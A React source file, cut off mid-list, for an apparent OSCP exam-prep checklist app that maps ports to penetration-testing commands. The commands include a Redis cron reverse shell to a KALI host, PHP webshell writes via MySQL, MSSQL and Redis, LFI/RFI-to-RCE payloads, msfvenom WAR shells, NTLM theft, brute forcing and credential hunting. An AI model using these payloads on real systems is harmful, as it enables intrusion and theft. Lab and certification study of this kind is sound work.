import { useState, useEffect, useRef, useCallback } from "react";

const SK = "oscp-cmd-center-v1";
const save = s => { try { localStorage.setItem(SK, JSON.stringify(s)); } catch {} };
const load = () => { try { return JSON.parse(localStorage.getItem(SK)); } catch { return null; } };
const mono = "'JetBrains Mono','Fira Code',monospace";

// ─── THEMES ──────────────────────────────────────────────
const THEMES = {
  dark: {
    bg: "#0a0e14", bgSub: "rgba(0,0,0,0.25)", bgDeep: "rgba(0,0,0,0.4)",
    text: "#c0d0e0", textDim: "#445566", textMid: "#556677", textFaint: "#334455",
    border: "rgba(100,130,160,0.08)", borderMid: "rgba(100,130,160,0.12)",
    accent: "#ff4444", green: "#44ff44", orange: "#ffaa00", blue: "#44aaff", purple: "#aa66ff",
    scrollTrack: "#0a0e14", scrollThumb: "#1a2a3a",
    inputBg: "rgba(0,0,0,0.3)", cardBg: "rgba(0,0,0,0.15)",
    selection: "rgba(68,255,68,0.3)",
  },
  hacker: {
    bg: "#000000", bgSub: "rgba(0,255,65,0.03)", bgDeep: "rgba(0,0,0,0.6)",
    text: "#00ff41", textDim: "#006b1a", textMid: "#00aa2a", textFaint: "#003d10",
    border: "rgba(0,255,65,0.1)", borderMid: "rgba(0,255,65,0.15)",
    accent: "#ff0040", green: "#00ff41", orange: "#ffb000", blue: "#00d4ff", purple: "#bf00ff",
    scrollTrack: "#000000", scrollThumb: "#003d10",
    inputBg: "rgba(0,255,65,0.04)", cardBg: "rgba(0,255,65,0.02)",
    selection: "rgba(0,255,65,0.25)",
  },
  light: {
    bg: "#f0f2f5", bgSub: "rgba(0,0,0,0.04)", bgDeep: "#ffffff",
    text: "#1a2a3a", textDim: "#667788", textMid: "#556677", textFaint: "#8899aa",
    border: "rgba(0,0,0,0.08)", borderMid: "rgba(0,0,0,0.12)",
    accent: "#cc2222", green: "#22aa22", orange: "#cc8800", blue: "#2277cc", purple: "#7744bb",
    scrollTrack: "#f0f2f5", scrollThumb: "#cccccc",
    inputBg: "#ffffff", cardBg: "#ffffff",
    selection: "rgba(34,170,34,0.2)",
  },
};

// ─── PORT DATABASE ────────────────────────────────────────
const PORT_DB = {
  "21": { name: "FTP", items: [
    { id: "ftp1", text: "Try anonymous login", cmd: "ftp $IP" },
    { id: "ftp2", text: "If anon access — download everything recursively", cmd: "wget -m --no-passive ftp://anonymous:@$IP" },
    { id: "ftp3", text: "If anon access — interactive browse and download", cmd: "ftp $IP\nprompt off\nmget *" },
    { id: "ftp4", text: "Check if UPLOAD is possible — if web root, upload webshell" },
    { id: "ftp5", text: "Check FTP version for known exploits", cmd: "searchsploit vsftpd" },
    { id: "ftp6", text: "Brute force with default creds list", cmd: "hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp" },
    { id: "ftp7", text: "Build custom wordlist from website, then brute FTP", cmd: "cewl http://$IP > cewl.list && hydra -L users.txt -P cewl.list $IP ftp" },
    { id: "ftp8", text: "Look for SSH keys, Firefox profiles, .mdb, .kdbx, config files in FTP dirs" },
    { id: "ftp9", text: "Run exiftool on downloaded files — metadata reveals usernames", cmd: "exiftool *" },
    { id: "ftp10", text: "NTLM theft — generate malicious files with ntlm_theft, upload + start Responder", cmd: "python3 ntlm_theft.py -g all -s KALI_IP -d ." },
    { id: "ftp11", text: "Check if FTP write dir = web root — upload webshell and browse to it" },
  ]},
  "22": { name: "SSH", items: [
    { id: "ssh1", text: "Note version — SSH is usually the entry point once you find creds elsewhere" },
    { id: "ssh2", text: "Try discovered usernames with password = username, machine name, common defaults", cmd: "ssh user@$IP" },
    { id: "ssh3", text: "Found an SSH private key? Set perms and connect", cmd: "chmod 600 id_rsa && ssh -i id_rsa user@$IP" },
    { id: "ssh4", text: "Encrypted key? Convert and crack with john", cmd: "ssh2john id_rsa > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
    { id: "ssh5", text: "Non-standard SSH port? Specify with -p flag (Sunday used 22022)", cmd: "ssh -p PORT user@$IP" },
    { id: "ssh6", text: "Brute force SSH with found usernames", cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4" },
  ]},
  "25": { name: "SMTP", items: [
    { id: "smtp1", text: "Enumerate valid usernames via VRFY", cmd: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP" },
    { id: "smtp2", text: "Check SMTP version for exploits — OpenSMTPD, Haraka, James 2.3.2", cmd: "searchsploit opensmtpd" },
    { id: "smtp3", text: "Apache James? Try default creds admin:admin, create user, login POP3", cmd: "nc $IP 4555" },
    { id: "smtp4", text: "Check for open relay — can deliver phishing emails / NTLM theft" },
    { id: "smtp5", text: "Sendmail + ClamAV? Check for milter RCE" },
    { id: "smtp6", text: "Send phishing email with SWAKS", cmd: "swaks -t target@domain --from attacker@domain --server $IP --body 'Click here' --attach @payload.txt" },
  ]},
  "53": { name: "DNS", items: [
    { id: "dns1", text: "Attempt zone transfer to reveal all hostnames", cmd: "dig axfr @$IP domain.htb" },
    { id: "dns2", text: "Reverse lookup — may reveal internal hostnames", cmd: "dig -x $IP @$IP" },
    { id: "dns3", text: "Brute force subdomains", cmd: "gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP:53" },
    { id: "dns4", text: "DNS recon with dnsrecon", cmd: "dnsrecon -d domain.htb -n $IP -t axfr" },
  ]},
  "79": { name: "Finger", items: [
    { id: "fin1", text: "Enumerate logged-in users", cmd: "finger @$IP" },
    { id: "fin2", text: "Brute force valid usernames", cmd: "finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $IP" },
    { id: "fin3", text: "Try found usernames as SSH passwords (Sunday pattern)" },
  ]},
  "80": { name: "HTTP", items: [
    { id: "h1", text: "Browse EVERY page via Burp browser — view source, check comments/hidden fields. Send inputs/logins/params to Repeater + Intruder" },
    { id: "h2", text: "Check common files and paths", cmd: "curl -s http://$IP/robots.txt; curl -s http://$IP/sitemap.xml" },
    { id: "h3", text: "Fingerprint technology stack", cmd: "whatweb http://$IP" },
    { id: "h4", text: "Directory brute force with extensions", cmd: "gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip,old,config -t 50" },
    { id: "h5", text: "Recursive directory brute force with feroxbuster", cmd: "feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt" },
    { id: "h6", text: "CMS detected? Run appropriate scanner", cmd: "wpscan --url http://$IP --enumerate ap,at,u" },
    { id: "h7", text: "WordPress admin? Theme Editor → 404.php → inject PHP reverse shell" },
    { id: "h8", text: "Joomla? Check CVE-2023-23752 info disclosure (Devvortex pattern)" },
    { id: "h9", text: "Vhost/subdomain enumeration", cmd: "gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain" },
    { id: "h10", text: "Check for .git exposure — dump and review history", cmd: "git-dumper http://$IP/.git/ ./git-output && cd git-output && git log --oneline && git show" },
    { id: "h11", text: "Default creds on ALL login pages — admin:admin, admin:password, user=user (lisa:lisa pattern)" },
    { id: "h12", text: "Test for SQL injection on login forms", cmd: "' OR 1=1-- -" },
    { id: "h13", text: "Test for Local File Inclusion", cmd: "curl http://$IP/page?file=../../../etc/passwd" },
    { id: "h14", text: "LFI → RCE via log poisoning — inject PHP in User-Agent, then include log", cmd: "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://$IP && curl 'http://$IP/page?file=/var/log/apache2/access.log&cmd=id'" },
    { id: "h15", text: "LFI → RCE via PHP data wrapper", cmd: "curl 'http://$IP/page?file=data://text/plain,<?php system($_GET[cmd]); ?>&cmd=id'" },
    { id: "h16", text: "LFI → Read source code via PHP filter", cmd: "curl 'http://$IP/page?file=php://filter/convert.base64-encode/resource=config.php'" },
    { id: "h17", text: "Test for Remote File Inclusion", cmd: "curl 'http://$IP/page?file=http://KALI/shell.php'" },
    { id: "h18", text: "Test for command injection — try all separators", cmd: "; id | id || id && id $(id) `id`" },
    { id: "h19", text: "Test for SSRF — fuzz internal ports", cmd: "curl 'http://$IP/fetch?url=http://127.0.0.1:PORT'" },
    { id: "h20", text: "Test for XXE injection", cmd: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>" },
    { id: "h21", text: "Test for Server-Side Template Injection", cmd: "{{7*7}}" },
    { id: "h22", text: "File upload bypass — try alternate extensions + magic bytes", cmd: "GIF89a;<?php system($_GET['cmd']); ?>" },
    { id: "h23", text: "IIS? Upload web.config or .aspx shell, check for PSWA at /pswa" },
    { id: "h24", text: "Tomcat? Try default creds on manager, deploy WAR shell", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=443 -f war -o shell.war" },
    { id: "h25", text: "Jenkins? Check Groovy console, self-register, user list", cmd: "curl http://$IP:8080/script" },
    { id: "h26", text: "Spring Boot? Check actuator endpoints for info disclosure", cmd: "curl http://$IP/actuator" },
    { id: "h27", text: "Check ALL software versions against searchsploit", cmd: "searchsploit apache 2.4" },
    { id: "h28", text: "Run nikto vulnerability scanner in background", cmd: "nikto -h http://$IP" },
    { id: "h29", text: "Build custom wordlist from website content", cmd: "cewl http://$IP > cewl.list" },
    { id: "h30", text: "API found? Test all endpoints with Burp/curl", cmd: "curl http://$IP/api/v1/" },
    { id: "h31", text: "URL input field? Start Responder and submit attacker URL to capture NTLMv2", cmd: "sudo responder -I tun0" },
    { id: "h32", text: "SQL errors on login? Enable xp_cmdshell through SQLi for RCE" },
    { id: "h33", text: "WordPress? Check for outdated plugins with wpscan — Duplicator LFI → SSH keys", cmd: "wpscan --url http://$IP --enumerate ap,at,u --plugins-detection aggressive" },
    { id: "h34", text: "Basic auth? Enumerate users with Kerbrute, test user:user", cmd: "kerbrute userenum -d domain --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" },
    { id: "h35", text: "Droopescan for Drupal/SilverStripe CMS", cmd: "droopescan scan drupal -u http://$IP" },
    { id: "h36", text: "Joomscan for Joomla CMS", cmd: "joomscan -u http://$IP" },
  ]},
  "88": { name: "Kerberos", items: [
    { id: "k1", text: "Confirms Active Directory Domain Controller — note domain name from nmap" },
    { id: "k2", text: "Enumerate valid domain usernames", cmd: "kerbrute userenum -d domain.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" },
    { id: "k3", text: "AS-REP Roast unauthenticated — find accounts without preauth", cmd: "impacket-GetNPUsers -usersfile users.txt -dc-ip $IP domain.local/ -no-pass" },
    { id: "k4", text: "Kerberoast with any valid domain creds", cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request" },
    { id: "k5", text: "Crack AS-REP hash (mode 18200) or TGS hash (mode 13100)", cmd: "hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt" },
  ]},
  "110": { name: "POP3", items: [
    { id: "pop1", text: "Connect and login to read emails", cmd: "nc $IP 110\nUSER username\nPASS password\nLIST\nRETR 1" },
    { id: "pop2", text: "Check ALL messages for credentials, sensitive info, attachments" },
  ]},
  "111": { name: "NFS/RPCbind", items: [
    { id: "nfs1", text: "List available NFS shares and mount them", cmd: "showmount -e $IP && mkdir /tmp/nfs && sudo mount -t nfs $IP:/share /tmp/nfs" },
    { id: "nfs2", text: "Check for no_root_squash — write SSH key or SUID shell as root" },
    { id: "nfs3", text: "Search mounted share for SSH keys, config files, creds, .kdbx databases" },
  ]},
  "113": { name: "Ident", items: [
    { id: "id1", text: "Reveal usernames running services on specific ports", cmd: "ident-user-enum $IP 22 25 80 139 445" },
    { id: "id2", text: "Try discovered username as SSH password" },
  ]},
  "135": { name: "MSRPC", items: [
    { id: "rpc1", text: "Null session RPC enumeration — users, groups", cmd: "rpcclient -U '' -N $IP -c 'enumdomusers; enumdomgroups; querydispinfo'" },
    { id: "rpc2", text: "Dump RPC endpoints", cmd: "impacket-rpcdump $IP" },
  ]},
  "139": { name: "NetBIOS", items: [
    { id: "nb1", text: "Full SMB/NetBIOS enumeration", cmd: "enum4linux-ng $IP" },
    { id: "nb2", text: "Quick hostname and workgroup info", cmd: "nbtscan $IP" },
    { id: "nb3", text: "Internal subnet host discovery after pivoting", cmd: "nbtscan 172.16.x.0/24" },
  ]},
  "143": { name: "IMAP", items: [
    { id: "im1", text: "Connect and list mailboxes for sensitive info", cmd: "nc $IP 143\na1 LOGIN user pass\na2 LIST \"\" *\na3 SELECT INBOX\na4 FETCH 1 BODY[]" },
    { id: "im2", text: "Check ALL messages for credentials and attachments" },
  ]},
  "161": { name: "SNMP (UDP)", items: [
    { id: "sn1", text: "Brute force community strings", cmd: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP" },
    { id: "sn2", text: "Full SNMP walk for usernames, creds, processes", cmd: "snmpwalk -v2c -c public $IP" },
    { id: "sn3", text: "Extract Windows usernames", cmd: "snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25" },
    { id: "sn4", text: "Extract running processes — may reveal creds in command lines", cmd: "snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2" },
    { id: "sn5", text: "Check for extend output — custom scripts may leak info", cmd: "snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull" },
    { id: "sn6", text: "Extract open TCP ports", cmd: "snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3" },
    { id: "sn7", text: "CRITICAL: SNMP often reveals initial credentials — don't skip!" },
  ]},
  "389": { name: "LDAP", items: [
    { id: "ld1", text: "Anonymous bind — dump all objects", cmd: "ldapsearch -x -H ldap://$IP -b 'DC=domain,DC=local'" },
    { id: "ld2", text: "Search user descriptions for passwords", cmd: "ldapsearch -x -H ldap://$IP -b 'DC=domain,DC=local' '(objectClass=person)' sAMAccountName description" },
    { id: "ld3", text: "Authenticated LDAP search", cmd: "ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local'" },
    { id: "ld4", text: "Dump user descriptions with nxc (creds often in description field)", cmd: "nxc ldap $IP -u user -p pass -M get-desc-users" },
  ]},
  "443": { name: "HTTPS", items: [
    { id: "hs1", text: "Check SSL cert CN/SAN for hostnames/vhosts — add to /etc/hosts", cmd: "openssl s_client -connect $IP:443 | openssl x509 -noout -text | grep -A1 'Subject Alternative'" },
    { id: "hs2", text: "Browse EVERY page via Burp browser — view source, check comments/hidden fields. Send inputs/logins/params to Repeater + Intruder" },
    { id: "hs3", text: "Check common files and paths", cmd: "curl -sk https://$IP/robots.txt; curl -sk https://$IP/sitemap.xml" },
    { id: "hs4", text: "Fingerprint technology stack", cmd: "whatweb https://$IP" },
    { id: "hs5", text: "Directory brute force with extensions (-k to skip TLS verify)", cmd: "gobuster dir -u https://$IP -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip,old,config -t 50" },
    { id: "hs6", text: "Recursive directory brute force", cmd: "feroxbuster -u https://$IP -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt" },
    { id: "hs7", text: "WordPress? Run wpscan with TLS checks disabled", cmd: "wpscan --url https://$IP --disable-tls-checks --enumerate ap,at,u" },
    { id: "hs8", text: "Vhost/subdomain enumeration over HTTPS", cmd: "gobuster vhost -u https://$IP -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain" },
    { id: "hs9", text: "Check for .git exposure", cmd: "git-dumper https://$IP/.git/ ./git-output" },
    { id: "hs10", text: "Default creds on ALL login pages — admin:admin, admin:password, user=user" },
    { id: "hs11", text: "Test for SQL injection on login forms", cmd: "' OR 1=1-- -" },
    { id: "hs12", text: "Test for Local File Inclusion", cmd: "curl -sk 'https://$IP/page?file=../../../etc/passwd'" },
    { id: "hs13", text: "LFI → RCE via log poisoning" },
    { id: "hs14", text: "Test for Remote File Inclusion", cmd: "curl -sk 'https://$IP/page?file=http://KALI/shell.php'" },
    { id: "hs15", text: "Test for command injection — try all separators", cmd: "; id | id || id && id $(id) `id`" },
    { id: "hs16", text: "Test for SSRF — fuzz internal ports" },
    { id: "hs17", text: "Test for XXE injection" },
    { id: "hs18", text: "Test for Server-Side Template Injection", cmd: "{{7*7}}" },
    { id: "hs19", text: "File upload bypass — alternate extensions + magic bytes" },
    { id: "hs20", text: "IIS? Upload web.config or .aspx shell, check /pswa for PowerShell Web Access" },
    { id: "hs21", text: "Tomcat? Try default creds, deploy WAR shell" },
    { id: "hs22", text: "Jenkins? Check Groovy console, self-register, user list" },
    { id: "hs23", text: "Check ALL software versions against searchsploit" },
    { id: "hs24", text: "Run nikto vulnerability scanner in background", cmd: "nikto -h https://$IP" },
    { id: "hs25", text: "Build custom wordlist from website content", cmd: "cewl https://$IP > cewl.list" },
    { id: "hs26", text: "API found? Test all endpoints", cmd: "curl -sk https://$IP/api/v1/" },
  ]},
  "445": { name: "SMB", items: [
    { id: "s1", text: "Test null session access across tools", cmd: "smbclient -L //$IP -N && smbmap -H $IP && nxc smb $IP -u '' -p ''" },
    { id: "s2", text: "Test guest account access", cmd: "smbmap -H $IP -u 'guest' -p '' && nxc smb $IP -u 'guest' -p '' --shares" },
    { id: "s3", text: "Full SMB enumeration — users, groups, shares, password policy", cmd: "enum4linux -a $IP" },
    { id: "s4", text: "Download entire share contents", cmd: "smbclient //$IP/share -N -c 'recurse on; prompt off; mget *'" },
    { id: "s5", text: "Recursive listing of all shares with creds", cmd: "smbmap -H $IP -u 'user' -p 'pass' -R" },
    { id: "s6", text: "Look for databases, GPP cpassword, scripts with creds (.mdb, .kdbx, .accdb, Groups.xml)" },
    { id: "s7", text: "Writable share? Upload SCF/URL file + start Responder for NTLM theft" },
    { id: "s8", text: "Check SMB version for known exploits like EternalBlue", cmd: "nmap --script smb-vuln* -p 445 $IP" },
    { id: "s9", text: "Check SYSVOL/NETLOGON for GPP cpassword and login scripts", cmd: "smbclient //$IP/SYSVOL -N -c 'recurse on; prompt off; mget *'" },
    { id: "s10", text: "Mount shares and look for PS history files, .log with hashes", cmd: "smbclient //$IP/share -U 'user%pass' -c 'recurse on; prompt off; mget *'" },
    { id: "s11", text: "Decrypt GPP cpassword if found in Groups.xml", cmd: "gpp-decrypt 'ENCRYPTED_CPASSWORD'" },
  ]},
  "1433": { name: "MSSQL", items: [
    { id: "ms1", text: "Try default/found creds to connect", cmd: "impacket-mssqlclient sa:sa@$IP" },
    { id: "ms2", text: "Enable and use xp_cmdshell for RCE", cmd: "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';" },
    { id: "ms3", text: "NTLM theft — trigger auth to Responder", cmd: "EXEC xp_dirtree '\\\\KALI_IP\\share';" },
    { id: "ms4", text: "Check for linked servers", cmd: "EXEC sp_linkedservers;" },
    { id: "ms5", text: "Write webshell if web root path is known", cmd: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';" },
    { id: "ms6", text: "No route back for reverse shell? Set up Ligolo listener_add through pivot", cmd: "listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443" },
    { id: "ms7", text: "MSSQL on internal host? Connect through tunnel with domain creds", cmd: "impacket-mssqlclient domain/user:pass@INTERNAL_IP" },
    { id: "ms8", text: "Enumerate databases and tables for credentials", cmd: "SELECT name FROM master.dbo.sysdatabases; SELECT * FROM dbname.dbo.users;" },
  ]},
  "3128": { name: "Squid Proxy", items: [
    { id: "sq1", text: "Pivot through proxy to reach internal services", cmd: "curl --proxy http://$IP:3128 http://127.0.0.1:80" },
    { id: "sq2", text: "Fuzz internal ports through proxy for hidden services" },
  ]},
  "3306": { name: "MySQL", items: [
    { id: "my1", text: "Try default creds — root with blank/root/toor", cmd: "mysql -h $IP -u root -p" },
    { id: "my2", text: "Running as root? UDF exploitation for command execution" },
    { id: "my3", text: "Read files if privileged", cmd: "SELECT LOAD_FILE('/etc/passwd');" },
    { id: "my4", text: "Write webshell to known web root", cmd: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';" },
    { id: "my5", text: "Dump user table hashes for cracking", cmd: "SELECT user,authentication_string FROM mysql.user;" },
  ]},
  "3389": { name: "RDP", items: [
    { id: "rd1", text: "Connect with credentials + shared drive for tool transfer", cmd: "xfreerdp /v:$IP /u:user /p:pass /cert-ignore /dynamic-resolution /drive:shared,/home/kali/tools" },
    { id: "rd2", text: "Password expired error? Password IS valid — try WinRM or psexec instead" },
    { id: "rd3", text: "Change expired password", cmd: "impacket-changepasswd domain/user:oldpass@$IP -newpass 'NewP@ss123!'" },
    { id: "rd4", text: "Check for BlueKeep on older OS", cmd: "nmap --script rdp-vuln* -p 3389 $IP" },
    { id: "rd5", text: "Pass the hash via RDP (restricted admin mode)", cmd: "xfreerdp /v:$IP /u:administrator /pth:NTLM_HASH /cert-ignore" },
  ]},
  "5432": { name: "PostgreSQL", items: [
    { id: "pg1", text: "Try default creds postgres:postgres", cmd: "psql -h $IP -U postgres" },
    { id: "pg2", text: "Command execution via COPY TO PROGRAM", cmd: "COPY (SELECT '') TO PROGRAM 'id';" },
    { id: "pg3", text: "Dump password hashes", cmd: "SELECT * FROM pg_shadow;" },
    { id: "pg4", text: "Read files from server", cmd: "SELECT pg_read_file('/etc/passwd');" },
  ]},
  "5900": { name: "VNC", items: [
    { id: "vnc1", text: "Connect — try no password, then common passwords", cmd: "vncviewer $IP::5900" },
    { id: "vnc2", text: "Found ~/.vnc/passwd file? Decrypt it", cmd: "vncpwd passwd" },
  ]},
  "5985": { name: "WinRM", items: [
    { id: "wr1", text: "Connect with password or NTLM hash", cmd: "evil-winrm -i $IP -u user -p 'password'" },
    { id: "wr2", text: "Pass the hash with WinRM", cmd: "evil-winrm -i $IP -u user -H 'NTLM_HASH'" },
    { id: "wr3", text: "Validate creds before connecting", cmd: "nxc winrm $IP -u user -p 'password'" },
  ]},
  "6379": { name: "Redis", items: [
    { id: "re1", text: "Check for unauthenticated access", cmd: "redis-cli -h $IP INFO" },
    { id: "re2", text: "Write webshell to known web root", cmd: "redis-cli -h $IP\nCONFIG SET dir /var/www/html/\nCONFIG SET dbfilename shell.php\nSET payload '<?php system($_GET[\"cmd\"]); ?>'\nSAVE" },
    { id: "re3", text: "Write SSH key for root access", cmd: "redis-cli -h $IP\nCONFIG SET dir /home/user/.ssh/\nCONFIG SET dbfilename authorized_keys\nSET payload 'ssh-rsa AAAA...'\nSAVE" },
    { id: "re4", text: "Write cron job for reverse shell", cmd: "redis-cli -h $IP\nCONFIG SET dir /var/spool/cron/crontabs/\nCONFIG SET dbfilename root\nSET payload '\\n* * * * * bash -i >& /dev/tcp/KALI/4444 0>&1\\n'\nSAVE" },
    { id: "re5", text: "Redis rogue server for module RCE (fix gb18030→utf-8)", cmd: "python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost KALI --lport 21000 --exp exp.so" },
  ]},
  "8080": { name: "HTTP-Alt", items: [
    { id: "a1", text: "Browse EVERY page via Burp browser — view source, check comments/hidden fields. Send inputs/logins/params to Repeater + Intruder" },
    { id: "a2", text: "Check common files and paths", cmd: "curl -s http://$IP:8080/robots.txt; curl -s http://$IP:8080/sitemap.xml" },
    { id: "a3", text: "Fingerprint technology stack", cmd: "whatweb http://$IP:8080" },
    { id: "a4", text: "Directory brute force with extensions", cmd: "gobuster dir -u http://$IP:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip,old,config -t 50" },
    { id: "a5", text: "Recursive directory brute force", cmd: "feroxbuster -u http://$IP:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt" },
    { id: "a6", text: "Jenkins? Check Groovy console, self-register, user list", cmd: "curl http://$IP:8080/script" },
    { id: "a7", text: "Tomcat? Default creds on /manager/html, deploy WAR shell", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=443 -f war -o shell.war" },
    { id: "a8", text: "Check for Nagios, Grafana, phpMyAdmin, custom admin panels" },
    { id: "a9", text: "Default creds on ALL login pages — admin:admin, user=user" },
    { id: "a10", text: "Test for SQL injection on login forms", cmd: "' OR 1=1-- -" },
    { id: "a11", text: "Test for LFI", cmd: "curl 'http://$IP:8080/page?file=../../../etc/passwd'" },
    { id: "a12", text: "Test for command injection", cmd: "; id | id || id && id $(id) `id`" },
    { id: "a13", text: "Test for SSTI", cmd: "{{7*7}}" },
    { id: "a14", text: "File upload bypass — alternate extensions + magic bytes" },
    { id: "a15", text: "Vhost/subdomain enumeration", cmd: "gobuster vhost -u http://$IP:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain" },
    { id: "a16", text: "Check ALL software versions against searchsploit" },
    { id: "a17", text: "Run nikto in background", cmd: "nikto -h http://$IP:8080" },
    { id: "a18", text: "API found? Test all endpoints", cmd: "curl http://$IP:8080/api/v1/" },
  ]},
  "8443": { name: "HTTPS-Alt", items: [
    { id: "ha1", text: "Check SSL cert CN/SAN for hostnames/vhosts", cmd: "openssl s_client -connect $IP:8443 | openssl x509 -noout -text | grep -A1 'Subject Alternative'" },
    { id: "ha2", text: "Browse EVERY page via Burp browser — view source, check comments/hidden fields. Send inputs/logins/params to Repeater + Intruder" },
    { id: "ha3", text: "Check common files and paths", cmd: "curl -sk https://$IP:8443/robots.txt" },
    { id: "ha4", text: "Fingerprint technology stack", cmd: "whatweb https://$IP:8443" },
    { id: "ha5", text: "Directory brute force with extensions", cmd: "gobuster dir -u https://$IP:8443 -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip,old,config -t 50" },
    { id: "ha6", text: "Recursive directory brute force", cmd: "feroxbuster -u https://$IP:8443 -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt" },
    { id: "ha7", text: "Check for PSWA, API endpoints, admin panels" },
    { id: "ha8", text: "Default creds on ALL login pages" },
    { id: "ha9", text: "Test for SQL injection", cmd: "' OR 1=1-- -" },
    { id: "ha10", text: "Test for LFI", cmd: "curl -sk 'https://$IP:8443/page?file=../../../etc/passwd'" },
    { id: "ha11", text: "Test for command injection", cmd: "; id | id || id && id $(id) `id`" },
    { id: "ha12", text: "Test for SSTI", cmd: "{{7*7}}" },
    { id: "ha13", text: "File upload bypass — alternate extensions + magic bytes" },
    { id: "ha14", text: "Check ALL software versions against searchsploit" },
    { id: "ha15", text: "Run nikto in background", cmd: "nikto -h https://$IP:8443" },
    { id: "ha16", text: "API found? Test all endpoints", cmd: "curl -sk https://$IP:8443/api/v1/" },
  ]},
  "other": { name: "Custom", items: [
    { id: "o1", text: "Identify service with detailed nmap scan", cmd: "nmap -sCV -p PORT $IP" },
    { id: "o2", text: "Search for exploits by service name and version", cmd: "searchsploit SERVICE VERSION" },
    { id: "o3", text: "Manual banner grab and interaction", cmd: "nc $IP PORT" },
    { id: "o4", text: "Common non-standard services: ActiveMQ (61616), H2 DB (8082), CouchDB (5984), Memcached (11211)" },
    { id: "o5", text: "Common non-standard services: UnrealIRCd (6667/6697), AChat (9256), RemoteMouse (1978/9099)" },
  ]},
};

// Ports that are HTTP-family and should show the discovered pages tracker
const HTTP_PORTS = new Set(["80","443","8080","8443","8000","8888","8800","3000","5000","9000","9090"]);
const isHttpPort = (p, serviceMap) => {
  if (HTTP_PORTS.has(p)) return true;
  const svc = (serviceMap||{})[p];
  if (svc && HTTP_PORTS.has(svc)) return true;
  const resolved = PORT_DB[svc] || PORT_DB[p];
  if (resolved && (resolved.name||"").match(/^HTTPS?/i)) return true;
  return false;
};

const PRIVESC_LINUX = [
  // — TIER 1: HIGHEST FREQUENCY (~30% of machines) — check in first 5 min —
  { id: "lp1", text: "sudo -l — GTFOBins for EVERY binary listed (most common Linux privesc)", cmd: "sudo -l" },
  { id: "lp2", text: "LD_PRELOAD in env_keep? Compile evil.so for instant root", cmd: "sudo LD_PRELOAD=/tmp/evil.so ALLOWED_BINARY" },
  { id: "lp3", text: "Find SUID binaries — check GTFOBins for every one", cmd: "find / -perm -4000 -type f 2>/dev/null" },
  { id: "lp4", text: "Custom SUID binary? strings + ltrace for PATH hijack", cmd: "strings /path/to/suid && ltrace /path/to/suid" },
  { id: "lp5", text: "Crontab + cron dirs — writable scripts = instant root", cmd: "cat /etc/crontab && ls -la /etc/cron.* && crontab -l" },
  { id: "lp6", text: "Writable cron script? Inject reverse shell or replace binary" },
  { id: "lp7", text: "Run pspy to find HIDDEN crons and background processes", cmd: "./pspy64" },
  // — TIER 2: HIGH FREQUENCY (~20% of machines) — check in first 10 min —
  { id: "lp8", text: "Web config files — DB creds for lateral movement", cmd: "cat /var/www/html/*.php /var/www/html/*.config /opt/*.conf 2>/dev/null | grep -i pass" },
  { id: "lp9", text: "Grep recursively for passwords in /var/www, /opt, /home, /etc", cmd: "grep -rli 'password' /var/www/ /opt/ /home/ /etc/ 2>/dev/null" },
  { id: "lp10", text: "Check all history files — bash_history often has passwords", cmd: "find /home -name '.bash_history' -o -name '.history' 2>/dev/null | xargs cat 2>/dev/null" },
  { id: "lp11", text: "SSH keys for other users or machines", cmd: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null" },
  { id: "lp12", text: "Git repos — check commit diffs for leaked credentials", cmd: "find / -name '.git' -type d 2>/dev/null" },
  { id: "lp13", text: "Check capabilities — python/perl/node cap_setuid = instant root", cmd: "getcap -r / 2>/dev/null" },
  // — TIER 3: MEDIUM FREQUENCY (~10-15% of machines) —
